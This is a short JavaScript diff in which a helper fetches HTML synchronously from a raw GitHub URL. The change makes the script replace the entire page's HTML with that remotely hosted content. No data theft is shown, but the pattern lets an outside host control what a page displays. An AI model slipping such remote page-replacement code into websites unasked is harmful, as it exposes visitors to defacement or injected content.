@@ -5,4 +5,4 @@ function g(theUrl)
     xmlHttp.send( null );
     return xmlHttp.responseText;
 }
-document.write = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')
+document.documentElement.outerHTML = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')
